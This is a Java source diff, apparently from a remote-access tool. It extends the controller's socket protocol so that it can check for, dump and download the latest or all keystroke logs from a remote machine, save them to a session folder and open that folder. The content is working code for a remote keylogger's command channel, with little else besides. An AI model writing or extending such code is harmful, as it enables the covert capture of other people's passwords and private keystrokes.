@@ -1,12 +1,10 @@
 package Connections;
 
 
+import GUI.ProgressBar.DownloadProgressBar;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
-import Information.SystemInformation;
-import Information.NetworkInformation;
-import Information.Action;
+import Information.*;
 
-import Information.Time;
 import org.json.JSONObject;
 
 
@@ -241,24 +239,50 @@ public class Streams {
     }
 
     public void sendJSON(KeyloggerEvents event) throws IOException {
+        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/"+new Time().getTime();
         switch (event) {
             case START -> sendSize(12);
             case STOP -> sendSize(13);
-            case DUMP -> {
-                sendSize(14);
-                receiveFile(getSessionFolder() + "/" + new Time().getTime() + "/KeyLogger Logs");
+            case DUMP_LAST -> {
+                if (sendAndReadJSONX(KeyloggerEvents.CHECK_LAST)) {
+                    sendSize(1401);
+                    receiveFile(nameOfSession);
+                    FolderOpener.open(nameOfSession);
+                }
+            }
+            case DUMP_ALL -> {
+                if (sendAndReadJSONX(KeyloggerEvents.CHECK_ALL)) {
+                    sendSize(1402);
+                    receiveLogs(nameOfSession);
+                    FolderOpener.open(nameOfSession);
+                }
             }
         }
     }
 
-    public String sendAndReadJSONX(KeyloggerEvents event) throws IOException {
+    private void receiveLogs(String nameOfSession) throws IOException {
+        while (readSize()!=-1){
+            receiveFile(nameOfSession);
+            sendSize(0);
+        }
+    }
+
+    public boolean sendAndReadJSONX(KeyloggerEvents event) throws IOException {
         switch (event) {
             case STATE -> {
                 sendSize(15);
-                return readString();
+                return Boolean.parseBoolean(readString());
+            }
+            case CHECK_LAST -> {
+                sendSize(1403);
+                return (readSize()!=0);
+            }
+            case CHECK_ALL -> {
+                sendSize(1404);
+                return (readSize()!=0);
             }
         }
-        return null;
+        return false;
     }
 
     public void sendList(List<String> fileList) throws IOException {
@@ -274,37 +298,27 @@ public class Streams {
         while (readSize() != -1) {
             listOfFiles.add(readString());
         }
-
         return listOfFiles;
     }
 
     public void sendSize(int size) throws IOException {
-
         dos.writeInt(size);
-
     }
 
     public void sendString(String message) throws IOException {
         byte[] buffer = message.getBytes();
         sendSize(buffer.length);
-
         dos.write(buffer);
-
-
     }
 
     public int readSize() throws IOException {
-
         return dis.readInt();
-
     }
 
     public String readString() throws IOException {
         int size = readSize();
         byte[] buffer = new byte[size];
-
         int read = is.read(buffer, 0, size);
-
         return new String(buffer);
     }
 
